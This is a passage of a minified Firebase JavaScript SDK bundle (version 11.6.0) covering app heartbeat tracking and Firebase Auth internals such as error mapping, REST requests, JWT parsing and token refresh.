 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pM=1024,mM=30;class gM{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new yM(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){var e,n;try{const i=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),s=Sw();if(((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((n=this._heartbeatsCache)===null||n===void 0?void 0:n.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===s||this._heartbeatsCache.heartbeats.some(o=>o.date===s))return;if(this._heartbeatsCache.heartbeats.push({date:s,agent:i}),this._heartbeatsCache.heartbeats.length>mM){const o=_M(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(o,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(r){Ar.warn(r)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const n=Sw(),{heartbeatsToSend:r,unsentEntries:i}=vM(this._heartbeatsCache.heartbeats),s=Ed(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=n,i.length>0?(this._heartbeatsCache.heartbeats=i,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),s}catch(n){return Ar.warn(n),""}}}function Sw(){return new Date().toISOString().substring(0,10)}function vM(t,e=pM){const n=[];let r=t.slice();for(const i of t){const s=n.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),bw(n)>e){s.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),bw(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class yM{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return tj()?nj().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const n=await fM(this.app);return n!=null&&n.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return Cw(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return Cw(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return}}function bw(t){return Ed(JSON.stringify({version:2,heartbeats:t})).length}function _M(t){if(t.length===0)return-1;let e=0,n=t[0].date;for(let r=1;r<t.length;r++)t[r].date<n&&(n=t[r].date,e=r);return e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function wM(t){Li(new Rr("platform-logger",e=>new Aj(e),"PRIVATE")),Li(new Rr("heartbeat",e=>new gM(e),"PRIVATE")),mn(jm,xw,t),mn(jm,xw,"esm2017"),mn("fire-js","")}wM("");var xM="firebase",EM="11.6.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */mn(xM,EM,"app");var Jn=function(){return Jn=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},Jn.apply(this,arguments)};function pc(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function CM(t,e,n){if(n||arguments.length===2)for(var r=0,i=e.length,s;r<i;r++)(s||!(r in e))&&(s||(s=Array.prototype.slice.call(e,0,r)),s[r]=e[r]);return t.concat(s||Array.prototype.slice.call(e))}function eb(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const SM=eb,tb=new hc("auth","Firebase",eb());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Td=new bh("@firebase/auth");function bM(t,...e){Td.logLevel<=_e.WARN&&Td.warn(`Auth (${Qi}): ${t}`,...e)}function Mu(t,...e){Td.logLevel<=_e.ERROR&&Td.error(`Auth (${Qi}): ${t}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ln(t,...e){throw Pv(t,...e)}function tr(t,...e){return Pv(t,...e)}function nb(t,e,n){const r=Object.assign(Object.assign({},SM()),{[e]:n});return new hc("auth","Firebase",r).create(e,{appName:t.name})}function Sr(t){return nb(t,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function Pv(t,...e){if(typeof t!="string"){const n=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=t.name),t._errorFactory.create(n,...r)}return tb.create(t,...e)}function ee(t,e,...n){if(!t)throw Pv(e,...n)}function wr(t){const e="INTERNAL ASSERTION FAILED: "+t;throw Mu(e),new Error(e)}function Or(t,e){t||wr(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fm(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.href)||""}function TM(){return Tw()==="http:"||Tw()==="https:"}function Tw(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function IM(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(TM()||ZD()||"connection"in navigator)?navigator.onLine:!0}function NM(){if(typeof navigator>"u")return null;const t=navigator;return t.languages&&t.languages[0]||t.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mc{constructor(e,n){this.shortDelay=e,this.longDelay=n,Or(n>e,"Short delay should be less than long delay!"),this.isMobile=Nv()||K1()}get(){return IM()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Rv(t,e){Or(t.emulator,"Emulator should always be set here");const{url:n}=t.emulator;return e?`${n}${e.startsWith("/")?e.slice(1):e}`:n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rb{static initialize(e,n,r){this.fetchImpl=e,n&&(this.headersImpl=n),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;wr("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;wr("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;wr("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kM={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const PM=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],RM=new mc(3e4,6e4);function Xi(t,e){return t.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:t.tenantId}):e}async function Ji(t,e,n,r,i={}){return ib(t,i,async()=>{let s={},o={};r&&(e==="GET"?o=r:s={body:JSON.stringify(r)});const a=ra(Object.assign({key:t.config.apiKey},o)).slice(1),c=await t._getAdditionalHeaders();c["Content-Type"]="application/json",t.languageCode&&(c["X-Firebase-Locale"]=t.languageCode);const u=Object.assign({method:e,headers:c},s);return JD()||(u.referrerPolicy="no-referrer"),rb.fetch()(await sb(t,t.config.apiHost,n,a),u)})}async function ib(t,e,n){t._canInitEmulator=!1;const r=Object.assign(Object.assign({},kM),e);try{const i=new OM(t),s=await Promise.race([n(),i.promise]);i.clearNetworkTimeout();const o=await s.json();if("needConfirmation"in o)throw uu(t,"account-exists-with-different-credential",o);if(s.ok&&!("errorMessage"in o))return o;{const a=s.ok?o.errorMessage:o.error.message,[c,u]=a.split(" : ");if(c==="FEDERATED_USER_ID_ALREADY_LINKED")throw uu(t,"credential-already-in-use",o);if(c==="EMAIL_EXISTS")throw uu(t,"email-already-in-use",o);if(c==="USER_DISABLED")throw uu(t,"user-disabled",o);const p=r[c]||c.toLowerCase().replace(/[_\s]+/g,"-");if(u)throw nb(t,p,u);Ln(t,p)}}catch(i){if(i instanceof sr)throw i;Ln(t,"network-request-failed",{message:String(i)})}}async function gc(t,e,n,r,i={}){const s=await Ji(t,e,n,r,i);return"mfaPendingCredential"in s&&Ln(t,"multi-factor-auth-required",{_serverResponse:s}),s}async function sb(t,e,n,r){const i=`${e}${n}?${r}`,s=t,o=s.config.emulator?Rv(t.config,i):`${t.config.apiScheme}://${i}`;return PM.includes(n)&&(await s._persistenceManagerAvailable,s._getPersistenceType()==="COOKIE")?s._getPersistence()._getFinalTarget(o).toString():o}function AM(t){switch(t){case"ENFORCE":return"ENFORCE";case"AUDIT":return"AUDIT";case"OFF":return"OFF";default:return"ENFORCEMENT_STATE_UNSPECIFIED"}}class OM{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((n,r)=>{this.timer=setTimeout(()=>r(tr(this.auth,"network-request-failed")),RM.get())})}}function uu(t,e,n){const r={appName:t.name};n.email&&(r.email=n.email),n.phoneNumber&&(r.phoneNumber=n.phoneNumber);const i=tr(t,e,r);return i.customData._tokenResponse=n,i}function Iw(t){return t!==void 0&&t.enterprise!==void 0}class DM{constructor(e){if(this.siteKey="",this.recaptchaEnforcementState=[],e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.recaptchaEnforcementState=e.recaptchaEnforcementState}getProviderEnforcementState(e){if(!this.recaptchaEnforcementState||this.recaptchaEnforcementState.length===0)return null;for(const n of this.recaptchaEnforcementState)if(n.provider&&n.provider===e)return AM(n.enforcementState);return null}isProviderEnabled(e){return this.getProviderEnforcementState(e)==="ENFORCE"||this.getProviderEnforcementState(e)==="AUDIT"}isAnyProviderEnabled(){return this.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")||this.isProviderEnabled("PHONE_PROVIDER")}}async function jM(t,e){return Ji(t,"GET","/v2/recaptchaConfig",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function MM(t,e){return Ji(t,"POST","/v1/accounts:delete",e)}async function Id(t,e){return Ji(t,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ll(t){if(t)try{const e=new Date(Number(t));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function LM(t,e=!1){const n=ft(t),r=await n.getIdToken(e),i=Av(r);ee(i&&i.exp&&i.auth_time&&i.iat,n.auth,"internal-error");const s=typeof i.firebase=="object"?i.firebase:void 0,o=s==null?void 0:s.sign_in_provider;return{claims:i,token:r,authTime:ll(ip(i.auth_time)),issuedAtTime:ll(ip(i.iat)),expirationTime:ll(ip(i.exp)),signInProvider:o||null,signInSecondFactor:(s==null?void 0:s.sign_in_second_factor)||null}}function ip(t){return Number(t)*1e3}function Av(t){const[e,n,r]=t.split(".");if(e===void 0||n===void 0||r===void 0)return Mu("JWT malformed, contained fewer than 3 sections"),null;try{const i=Cd(n);return i?JSON.parse(i):(Mu("Failed to decode base64 JWT payload"),null)}catch(i){return Mu("Caught error parsing JWT payload as JSON",i==null?void 0:i.toString()),null}}function Nw(t){const e=Av(t);return ee(e,"internal-error"),ee(typeof e.exp<"u","internal-error"),ee(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function zl(t,e,n=!1){if(n)return e;try{return await e}catch(r){throw r instanceof sr&&FM(r)&&t.auth.currentUser===t&&await t.auth.signOut(),r}}function FM({code:t}){return t==="auth/user-disabled"||t==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class UM{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var n;if(e){const r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;const i=((n=this.user.stsTokenManager.expirationTime)!==null&&n!==void 0?n:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;const n=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},n)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Um{constructor(e,n){this.createdAt=e,this.lastLoginAt=n,this._initializeTime()}_initializeTime(){this.lastSignInTime=ll(this.lastLoginAt),this.creationTime=ll(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Nd(t){var e;const n=t.auth,r=await t.getIdToken(),i=await zl(t,Id(n,{idToken:r}));ee(i==null?void 0:i.users.length,n,"internal-error");const s=i.users[0];t._notifyReloadListener(s);const o=!((e=s.providerUserInfo)===null||e===void 0)&&e.length?ob(s.providerUserInfo):[],a=zM(t.providerData,o),c=t.isAnonymous,u=!(t.email&&s.passwordHash)&&!(a!=null&&a.length),p=c?u:!1,f={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:a,metadata:new Um(s.createdAt,s.lastLoginAt),isAnonymous:p};Object.assign(t,f)}async function $M(t){const e=ft(t);await Nd(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function zM(t,e){return[...t.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function ob(t){return t.map(e=>{var{providerId:n}=e,r=pc(e,["providerId"]);return{providerId:n,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function BM(t,e){const n=await ib(t,{},async()=>{const r=ra({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:s}=t.config,o=await sb(t,i,"/v1/token",`key=${s}`),a=await t._getAdditionalHeaders();return a["Content-Type"]="application/x-www-form-urlencoded",rb.fetch()(o,{method:"POST",headers:a,body:r})});return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}}async function VM(t,e){return Ji(t,"POST","/v2/accounts:revokeToken",Xi(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mo{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){ee(e.idToken,"internal-error"),ee(typeof e.idToken<"u","internal-error"),ee(typeof e.refreshToken<"u","internal-error");const n="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):Nw(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,n)}updateFromIdToken(e){ee(e.length!==0,"internal-error");const n=Nw(e);this.updateTokensAndExpiration(e,null,n)}async getToken(e,n=!1){return!n&&this.accessToken&&!this.isExpired?this.accessToken:(ee(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,n){const{accessToken:r,refreshToken:i,expiresIn:s}=await BM(e,n);this.updateTokensAndExpiration(r,i,Number(s))}updateTokensAndExpiration(e,n,r){this.refreshToken=n||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,n){const{refreshToken:r,accessToken:i,expirationTime:s}=n,o=new mo;return r&&(ee(typeof r=="string","internal-error",{appName:e}),o.refreshToken=r),i&&(ee(typeof i=="string","internal-error",{appName:e}),o.accessToken=i),s&&(ee(typeof s=="number","internal-error",{appName:e}),o.expirationTime=s),o}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new mo,this.toJSON())}_performRefresh(){return wr("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
